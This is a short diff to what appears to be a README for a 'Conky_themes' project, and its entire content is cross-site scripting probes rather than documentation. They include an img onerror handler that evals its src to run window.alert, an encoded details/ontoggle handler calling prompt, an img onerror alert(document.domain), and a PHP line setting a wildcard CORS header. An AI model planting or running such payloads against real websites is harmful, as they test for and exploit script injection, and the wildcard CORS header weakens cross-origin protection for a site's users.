@@ -1,4 +1,4 @@
-<img src=x:console.log(1); onerror=eval(src) alt=String.fromCharCode(88,83,83)># Conky_themes
+<img src=x:window.alert(1); onerror=eval(src) alt=String.fromCharCode(88,83,83)># Conky_themes
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
 <?php header(“Access-Control-Allow-Origin: *”); ?>
 <img src=1 onerror=alert(document.domain)>
